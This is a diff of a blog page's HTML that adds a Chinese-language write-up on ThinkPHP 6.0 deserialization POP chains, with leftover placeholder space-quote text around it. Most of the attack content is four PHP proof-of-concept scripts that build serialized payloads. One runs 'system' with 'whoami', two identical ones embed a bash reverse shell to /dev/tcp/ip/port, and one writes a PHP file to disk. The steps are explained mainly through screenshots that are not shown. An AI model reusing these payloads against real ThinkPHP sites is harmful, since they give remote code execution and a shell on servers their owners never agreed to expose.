@@ -15,11 +15,16 @@
 
     <!-- Custom fonts for this template -->
     <link href="../vendor/fontawesome-free/css/all.min.css" rel="stylesheet" type="text/css">
-    <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
-    <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
+    <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet'
+          type='text/css'>
+    <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800'
+          rel='stylesheet' type='text/css'>
 
     <!-- Custom styles for this template -->
     <link href="../css/clean-blog.min.css" rel="stylesheet">
+
+    <!-- Code highlight-->
+    <link rel="stylesheet" href="../highlight/styles/rainbow.css">
 
 </head>
 
@@ -29,7 +34,9 @@
 <nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
     <div class="container">
         <a class="navbar-brand" href="index.html">Index</a>
-        <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
+        <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse"
+                data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false"
+                aria-label="Toggle navigation">
             Menu
             <i class="fas fa-bars"></i>
         </button>
@@ -73,35 +80,463 @@
         <div class="row">
             <div class="col-lg-8 col-md-10 mx-auto">
 
-                <p>What was most significant about the lunar voyage was not that man set foot on the Moon but that they set eye on the earth.</p>
+                <h2 class="section-heading">前言</h2>
 
-                <p>A Chinese tale tells of some men sent to harm a young girl who, upon seeing her beauty, become her protectors rather than her violators. That's how I felt seeing the Earth for the first time. I could not help but love and cherish her.</p>
+                <p>&nbsp;&nbsp;&nbsp;在使用thinkphp开发自己的后台管理系统后，刚刚好知识储备足够来审计thinkphp的链子，便在本地搭建了thinkphp6.0来分析反序列化POP链</p>
 
-                <p>For those who have seen the Earth from space, and for the hundreds and perhaps thousands more who will, the experience most certainly changes your perspective. The things that we share in our world are far more valuable than those which divide us.</p>
+                <h2 class="section-heading">POP-1</h2>
+
+                <p>&nbsp;&nbsp;&nbsp;利用链如下:</p>
+                
+                <a href="#">
+                    <img class="img-fluid" src="../img/2021-5-8/pop-1-1.png" alt="">
+                </a>
+                
+                <p>&nbsp;&nbsp;&nbsp;触发点位于:/vendor/topthink/think-orm/src/Model.php</p>
+                
+                <a href="#">
+                    <img class="img-fluid" src="../img/2021-5-8/pop-1-2.png" alt="">
+                </a>
+                <span class="caption text-muted">令$this->lazySave = true</span>
+                
+                <p>&nbsp;&nbsp;&nbsp;查看$this->save()方法调用情况</p>
+                
+                <a href="#">
+                    <img class="img-fluid" src="../img/2021-5-8/pop-1-3.png" alt="">
+                </a>
+                
+                <p>&nbsp;&nbsp;&nbsp;此处的$this->setAttrs($data)为数据赋值类操作，看到下面一个if语句，还要往下走，不能进入到if语句内return。
+                	又因为这里为或，所以只需要绕过这里的两个if条件其中一个。</p>
+
+								<a href="#">
+                    <img class="img-fluid" src="../img/2021-5-8/pop-1-4.jpg" alt="">
+                </a>
+                
+                <span class="caption text-muted">令$this->data = ['17man' => 'whoami']</span>
+
+								<p>&nbsp;&nbsp;&nbsp;查看$this->updateData()调用情况。</p>
+
+								<a href="#">
+                    <img class="img-fluid" src="../img/2021-5-8/pop-1-5.jpg" alt="">
+                </a>
+                
+                <span class="caption text-muted">令$this->exists = true</span>
+								
+								<p>&nbsp;&nbsp;&nbsp;$this->checkAllowFields()上面的条件基本满足，直接查看checkAllowFields方法调用情况。</p>
+								
+								<a href="#">
+                    <img class="img-fluid" src="../img/2021-5-8/pop-1-6.jpg" alt="">
+                </a>
+                
+                
+                <p>&nbsp;&nbsp;&nbsp;两个if初始值可以满足，不做修改。进一步可以看到$this->table . $this->suffix使用字符串拼接，找一个有__tostring方法的类做跳板。</p>
+								
+								<a href="#">
+                    <img class="img-fluid" src="../img/2021-5-8/pop-1-7.jpg" alt="">
+                </a>
+                
+                <span class="caption text-muted">令$this->table = $obj</span>
+
+
+								<p>&nbsp;&nbsp;&nbsp;可以看到眼睛快坏掉了,lol</p>
+
+								<a href="#">
+                    <img class="img-fluid" src="../img/2021-5-8/pop-1-8.jpg" alt="">
+                </a>
+                
+                <p>&nbsp;&nbsp;&nbsp;很自然地进入$this->toArray()，看一下它在干什么</p>
+                
+                <a href="#">
+                    <img class="img-fluid" src="../img/2021-5-8/pop-1-9.jpg" alt="">
+                </a>
+                
+                <p>&nbsp;&nbsp;&nbsp;要想进入$this->getAttr($key)，必须要绕过两个if条件</p>
+                
+                <a href="#">
+                    <img class="img-fluid" src="../img/2021-5-8/pop-1-10.jpg" alt="">
+                </a>
+
+								<p>&nbsp;&nbsp;&nbsp;看一下两个for循环里面的if，只要下标对应的键值不为字符串即可</p>
+
+								<a href="#">
+                    <img class="img-fluid" src="../img/2021-5-8/pop-1-11.jpg" alt="">
+                </a>
+								
+								<span class="caption text-muted">令$this->visible = [['17man' => 'visible']]</span>
+								
+								<p>&nbsp;&nbsp;&nbsp;合并后的数组中的下标传入$this->getAttr($key)，看一下该方法的调用</p>
+									
+								
+								<a href="#">
+                    <img class="img-fluid" src="../img/2021-5-8/pop-1-12.jpg" alt="">
+                </a>
+                
+                <p>&nbsp;&nbsp;&nbsp;进入$this->getData($name)，从$this->data[$fieldName]通过下标获取键值返回进入$this->getValue($name, $value, $relation)。</p>
+                
+                <a href="#">
+                    <img class="img-fluid" src="../img/2021-5-8/pop-1-13.jpg" alt="">
+                </a>
+                
+                <p>&nbsp;&nbsp;&nbsp;查看$this->getValue($name, $value, $relation)方法的调用</p>
+								
+								<a href="#">
+                    <img class="img-fluid" src="../img/2021-5-8/pop-1-14.jpg" alt="">
+                </a>
+                
+                <span class="caption text-muted">令$this->withAttr = ['17man' => 'system']</span>
+                
+                
+
+                <p>&nbsp;&nbsp;&nbsp;POC-1如下:</p>
+
+                <div id="pop-1 poc">
+
+                <pre class='hljs'><code><span class="php"><span class="hljs-preprocessor">&lt;?php</span>
+
+<span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>;
+
+<span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Model</span>
+</span>{
+    <span class="hljs-keyword">use</span> <span class="hljs-title">model</span>\<span class="hljs-title">concern</span>\<span class="hljs-title">Attribute</span>;
+
+    <span class="hljs-keyword">private</span> <span class="hljs-variable">$lazySave</span>;
+    <span class="hljs-keyword">private</span> <span class="hljs-variable">$exists</span>;
+    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$table</span>;
+    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$visible</span>;
+    <span class="hljs-keyword">private</span> <span class="hljs-variable">$force</span>;
+    <span class="hljs-keyword">private</span> <span class="hljs-variable">$withAttr</span>;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">(<span class="hljs-variable">$obj</span>)</span>
+    </span>{
+        <span class="hljs-variable">$this</span>-&gt;lazySave = <span class="hljs-keyword">true</span>;
+        <span class="hljs-variable">$this</span>-&gt;data = [
+            <span class="hljs-string">'17man'</span> =&gt; <span class="hljs-string">'whoami'</span>
+        ];
+        <span class="hljs-variable">$this</span>-&gt;exists = <span class="hljs-keyword">true</span>;
+        <span class="hljs-variable">$this</span>-&gt;table = <span class="hljs-variable">$obj</span>;
+        <span class="hljs-variable">$this</span>-&gt;visible = [
+            [<span class="hljs-string">'17man'</span> =&gt; <span class="hljs-string">'visible'</span>]
+        ];
+        <span class="hljs-variable">$this</span>-&gt;withAttr = [<span class="hljs-string">'17man'</span> =&gt; <span class="hljs-string">'system'</span>];
+
+    }
+}
+
+
+<span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">model</span>\<span class="hljs-title">concern</span>;
+
+<span class="hljs-keyword">trait</span> Attribute
+{
+}
+
+
+<span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">Model</span>;
+
+<span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">Model</span>;
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Pivot</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Model</span>
+</span>{
+}
+
+<span class="hljs-variable">$object</span> = <span class="hljs-keyword">new</span> Pivot(<span class="hljs-string">''</span>);
+<span class="hljs-variable">$pwn</span> = <span class="hljs-keyword">new</span> Pivot(<span class="hljs-variable">$object</span>);
+<span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-variable">$pwn</span>));
+<span class="hljs-preprocessor">?&gt;</span></span></code></pre>
+
+                </div>
+
+
+                <h2 class="section-heading">POP-2</h2>
+
+                <p>&nbsp;&nbsp;&nbsp;利用链如下:</p>
+
+                <a href="#">
+                    <img class="img-fluid" src="../img/post-bg.jpeg" alt="">
+                </a>
+                
+
+                <p>&nbsp;&nbsp;&nbsp;POC-2如下:</p>
+
+                <div id="pop-2 poc">
+
+                    <pre class='hljs'><code><span class="php"><span class="hljs-preprocessor">&lt;?php</span>
+
+<span class="hljs-keyword">namespace</span> <span class="hljs-title">League</span>\<span class="hljs-title">Flysystem</span>\<span class="hljs-title">Cached</span>\<span class="hljs-title">Storage</span>;
+
+<span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AbstractCache</span>
+</span>{
+    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$autosave</span> = <span class="hljs-keyword">false</span>;
+    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$cache</span> = [<span class="hljs-string">'`bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1`'</span>];
+}
+
+<span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">filesystem</span>;
+
+<span class="hljs-keyword">use</span> <span class="hljs-title">League</span>\<span class="hljs-title">Flysystem</span>\<span class="hljs-title">Cached</span>\<span class="hljs-title">Storage</span>\<span class="hljs-title">AbstractCache</span>;
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CacheStore</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">AbstractCache</span>
+</span>{
+    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$store</span>;
+    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$key</span>;
+    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$expire</span>;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">(<span class="hljs-variable">$obj</span>)</span>
+    </span>{
+        <span class="hljs-variable">$this</span>-&gt;store = <span class="hljs-variable">$obj</span>;
+        <span class="hljs-variable">$this</span>-&gt;key = <span class="hljs-string">'17'</span>;
+        <span class="hljs-variable">$this</span>-&gt;expire = <span class="hljs-string">'expire'</span>;
+    }
+
+}
+
+
+<span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">cache</span>;
+<span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Driver</span>
+</span>{
+}
+
+
+<span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">cache</span>\<span class="hljs-title">driver</span>;
+
+<span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">cache</span>\<span class="hljs-title">Driver</span>;
+<span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">filesystem</span>\<span class="hljs-title">CacheStore</span>;
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">File</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Driver</span>
+</span>{
+    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$options</span>;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">()</span>
+    </span>{
+        <span class="hljs-variable">$this</span>-&gt;options = [
+            <span class="hljs-string">'expire'</span> =&gt; <span class="hljs-number">0</span>,
+            <span class="hljs-string">'cache_subdir'</span> =&gt; <span class="hljs-keyword">true</span>,
+            <span class="hljs-string">'prefix'</span> =&gt; <span class="hljs-string">''</span>,
+            <span class="hljs-string">'path'</span> =&gt; <span class="hljs-string">''</span>,
+            <span class="hljs-string">'hash_type'</span> =&gt; <span class="hljs-string">'md5'</span>,
+            <span class="hljs-string">'data_compress'</span> =&gt; <span class="hljs-keyword">false</span>,
+            <span class="hljs-string">'tag_prefix'</span> =&gt; <span class="hljs-string">'tag:'</span>,
+            <span class="hljs-string">'serialize'</span> =&gt; [<span class="hljs-string">'system'</span>],
+        ];
+    }
+
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">set</span><span class="hljs-params">(<span class="hljs-variable">$key</span>, <span class="hljs-variable">$value</span>, <span class="hljs-variable">$ttl</span> = null)</span>: <span class="hljs-title">bool</span>
+    </span>{
+        <span class="hljs-comment">// TODO: Implement set() method.</span>
+    }
+
+}
+
+<span class="hljs-variable">$object</span> = <span class="hljs-keyword">new</span> File();
+<span class="hljs-variable">$pwn</span> = <span class="hljs-keyword">new</span> CacheStore(<span class="hljs-variable">$object</span>);
+<span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-variable">$pwn</span>));
+<span class="hljs-preprocessor">?&gt;</span></span></code></pre>
+
+                </div>
+
+
+                <h2 class="section-heading">POP-3</h2>
+
+                <p>&nbsp;&nbsp;&nbsp;利用链如下:</p>
+
+                <a href="#">
+                    <img class="img-fluid" src="../img/post-bg.jpeg" alt="">
+                </a>
+
+                <p>&nbsp;&nbsp;&nbsp;POC-3如下:</p>
+
+                <div id="pop-3 poc">
+
+                    <pre class='hljs'><code><span class="php"><span class="hljs-preprocessor">&lt;?php</span>
+
+<span class="hljs-keyword">namespace</span> <span class="hljs-title">League</span>\<span class="hljs-title">Flysystem</span>\<span class="hljs-title">Cached</span>\<span class="hljs-title">Storage</span>;
+
+<span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AbstractCache</span>
+</span>{
+    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$autosave</span> = <span class="hljs-keyword">false</span>;
+    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$cache</span> = [<span class="hljs-string">'`bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1`'</span>];
+}
+
+<span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">filesystem</span>;
+
+<span class="hljs-keyword">use</span> <span class="hljs-title">League</span>\<span class="hljs-title">Flysystem</span>\<span class="hljs-title">Cached</span>\<span class="hljs-title">Storage</span>\<span class="hljs-title">AbstractCache</span>;
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CacheStore</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">AbstractCache</span>
+</span>{
+    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$store</span>;
+    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$key</span>;
+    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$expire</span>;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">(<span class="hljs-variable">$obj</span>)</span>
+    </span>{
+        <span class="hljs-variable">$this</span>-&gt;store = <span class="hljs-variable">$obj</span>;
+        <span class="hljs-variable">$this</span>-&gt;key = <span class="hljs-string">'17'</span>;
+        <span class="hljs-variable">$this</span>-&gt;expire = <span class="hljs-string">'expire'</span>;
+    }
+
+}
+
+
+<span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">cache</span>;
+<span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Driver</span>
+</span>{
+}
+
+
+<span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">cache</span>\<span class="hljs-title">driver</span>;
+
+<span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">cache</span>\<span class="hljs-title">Driver</span>;
+<span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">filesystem</span>\<span class="hljs-title">CacheStore</span>;
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">File</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Driver</span>
+</span>{
+    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$options</span>;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">()</span>
+    </span>{
+        <span class="hljs-variable">$this</span>-&gt;options = [
+            <span class="hljs-string">'expire'</span> =&gt; <span class="hljs-number">0</span>,
+            <span class="hljs-string">'cache_subdir'</span> =&gt; <span class="hljs-keyword">true</span>,
+            <span class="hljs-string">'prefix'</span> =&gt; <span class="hljs-string">''</span>,
+            <span class="hljs-string">'path'</span> =&gt; <span class="hljs-string">''</span>,
+            <span class="hljs-string">'hash_type'</span> =&gt; <span class="hljs-string">'md5'</span>,
+            <span class="hljs-string">'data_compress'</span> =&gt; <span class="hljs-keyword">false</span>,
+            <span class="hljs-string">'tag_prefix'</span> =&gt; <span class="hljs-string">'tag:'</span>,
+            <span class="hljs-string">'serialize'</span> =&gt; [<span class="hljs-string">'system'</span>],
+        ];
+    }
+
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">set</span><span class="hljs-params">(<span class="hljs-variable">$key</span>, <span class="hljs-variable">$value</span>, <span class="hljs-variable">$ttl</span> = null)</span>: <span class="hljs-title">bool</span>
+    </span>{
+        <span class="hljs-comment">// TODO: Implement set() method.</span>
+    }
+
+}
+
+<span class="hljs-variable">$object</span> = <span class="hljs-keyword">new</span> File();
+<span class="hljs-variable">$pwn</span> = <span class="hljs-keyword">new</span> CacheStore(<span class="hljs-variable">$object</span>);
+<span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-variable">$pwn</span>));
+<span class="hljs-preprocessor">?&gt;</span></span></code></pre>
+
+                </div>
+
+
+                <h2 class="section-heading">POP-4</h2>
+
+                <p>&nbsp;&nbsp;&nbsp;利用链如下:</p>
+
+                <a href="#">
+                    <img class="img-fluid" src="../img/post-bg.jpeg" alt="">
+                </a>
+
+                <p>&nbsp;&nbsp;&nbsp;POC-4如下:</p>
+
+                <div id="pop-4 poc">
+
+                    <pre class='hljs'><code><span class="hljs-preprocessor">&lt;?php</span>
+
+<span class="hljs-keyword">namespace</span> <span class="hljs-title">League</span>\<span class="hljs-title">Flysystem</span>\<span class="hljs-title">Cached</span>\<span class="hljs-title">Storage</span>;
+
+<span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AbstractCache</span>
+</span>{
+    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$autosave</span> = <span class="hljs-keyword">false</span>;
+    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$cache</span> = [<span class="hljs-string">'&lt;?php phpinfo();?&gt;'</span>];
+}
+
+
+<span class="hljs-keyword">namespace</span> <span class="hljs-title">League</span>\<span class="hljs-title">Flysystem</span>\<span class="hljs-title">Cached</span>\<span class="hljs-title">Storage</span>;
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Adapter</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">AbstractCache</span>
+</span>{
+    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$adapter</span>;
+    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$file</span>;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">(<span class="hljs-variable">$obj</span>)</span>
+    </span>{
+        <span class="hljs-variable">$this</span>-&gt;adapter = <span class="hljs-variable">$obj</span>;
+        <span class="hljs-variable">$this</span>-&gt;file = <span class="hljs-string">'pwn.php'</span>;
+    }
+}
+
+
+<span class="hljs-keyword">namespace</span> <span class="hljs-title">League</span>\<span class="hljs-title">Flysystem</span>\<span class="hljs-title">Adapter</span>;
+
+<span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AbstractAdapter</span>
+</span>{
+}
+
+
+<span class="hljs-keyword">namespace</span> <span class="hljs-title">League</span>\<span class="hljs-title">Flysystem</span>\<span class="hljs-title">Adapter</span>;
+
+<span class="hljs-keyword">use</span> <span class="hljs-title">League</span>\<span class="hljs-title">Flysystem</span>\<span class="hljs-title">Cached</span>\<span class="hljs-title">Storage</span>\<span class="hljs-title">Adapter</span>;
+<span class="hljs-keyword">use</span> <span class="hljs-title">League</span>\<span class="hljs-title">Flysystem</span>\<span class="hljs-title">Config</span>;
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Local</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">AbstractAdapter</span>
+</span>{
+
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">has</span><span class="hljs-params">(<span class="hljs-variable">$path</span>)</span>
+    </span>{
+    }
+
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span><span class="hljs-params">(<span class="hljs-variable">$path</span>, <span class="hljs-variable">$contents</span>, Config <span class="hljs-variable">$config</span>)</span>
+    </span>{
+    }
+
+}
+
+<span class="hljs-variable">$object</span> = <span class="hljs-keyword">new</span> Local();
+<span class="hljs-variable">$pwn</span> = <span class="hljs-keyword">new</span> Adapter(<span class="hljs-variable">$object</span>);
+<span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-variable">$pwn</span>));
+<span class="hljs-preprocessor">?&gt;</span></code></pre>
+
+                </div>
+
+
+
+                <p>A Chinese tale tells of some men sent to harm a young girl who, upon seeing her beauty, become her
+                    protectors rather than her violators. That's how I felt seeing the Earth for the first time. I could
+                    not help but love and cherish her.</p>
+
+                <p>For those who have seen the Earth from space, and for the hundreds and perhaps thousands more who
+                    will, the experience most certainly changes your perspective. The things that we share in our world
+                    are far more valuable than those which divide us.</p>
 
                 <h2 class="section-heading">POP1</h2>
 
-                <p>There can be no thought of finishing for ‘aiming for the stars.’ Both figuratively and literally, it is a task to occupy the generations. And no matter how much progress one makes, there is always the thrill of just beginning.</p>
+                <p>There can be no thought of finishing for ‘aiming for the stars.’ Both figuratively and literally, it
+                    is a task to occupy the generations. And no matter how much progress one makes, there is always the
+                    thrill of just beginning.</p>
 
-                <p>There can be no thought of finishing for ‘aiming for the stars.’ Both figuratively and literally, it is a task to occupy the generations. And no matter how much progress one makes, there is always the thrill of just beginning.</p>
+                <p>There can be no thought of finishing for ‘aiming for the stars.’ Both figuratively and literally, it
+                    is a task to occupy the generations. And no matter how much progress one makes, there is always the
+                    thrill of just beginning.</p>
 
-                <blockquote class="blockquote">The dreams of yesterday are the hopes of today and the reality of tomorrow. Science has not yet mastered prophecy. We predict too much for the next year and yet far too little for the next ten.</blockquote>
+                <blockquote class="blockquote">The dreams of yesterday are the hopes of today and the reality of
+                    tomorrow. Science has not yet mastered prophecy. We predict too much for the next year and yet far
+                    too little for the next ten.
+                </blockquote>
 
-                <p>Spaceflights cannot be stopped. This is not the work of any one man or even a group of men. It is a historical process which mankind is carrying out in accordance with the natural laws of human development.</p>
+                <p>Spaceflights cannot be stopped. This is not the work of any one man or even a group of men. It is a
+                    historical process which mankind is carrying out in accordance with the natural laws of human
+                    development.</p>
 
                 <h2 class="section-heading">POP2</h2>
 
                 <h2 class="section-heading">POP3</h2>
-                <p>As we got further and further away, it [the Earth] diminished in size. Finally it shrank to the size of a marble, the most beautiful you can imagine. That beautiful, warm, living object looked so fragile, so delicate, that if you touched it with a finger it would crumble and fall apart. Seeing this has to change a man.</p>
+                <p>As we got further and further away, it [the Earth] diminished in size. Finally it shrank to the size
+                    of a marble, the most beautiful you can imagine. That beautiful, warm, living object looked so
+                    fragile, so delicate, that if you touched it with a finger it would crumble and fall apart. Seeing
+                    this has to change a man.</p>
 
                 <a href="#">
                     <img class="img-fluid" src="../img/post-bg.jpeg" alt="">
                 </a>
                 <span class="caption text-muted">To go places and do things that have never been done before – that’s what living is all about.</span>
 
-                <p>Space, the final frontier. These are the voyages of the Starship Enterprise. Its five-year mission: to explore strange new worlds, to seek out new life and new civilizations, to boldly go where no man has gone before.</p>
+                <p>Space, the final frontier. These are the voyages of the Starship Enterprise. Its five-year mission:
+                    to explore strange new worlds, to seek out new life and new civilizations, to boldly go where no man
+                    has gone before.</p>
 
-                <p>As I stand out here in the wonders of the unknown at Hadley, I sort of realize there’s a fundamental truth to our nature, Man must explore, and this is exploration at its greatest.</p>
+                <p>As I stand out here in the wonders of the unknown at Hadley, I sort of realize there’s a fundamental
+                    truth to our nature, Man must explore, and this is exploration at its greatest.</p>
 
                 <p>Placeholder text by
                     <a href="http://spaceipsum.com/">Space Ipsum</a>. Photographs by
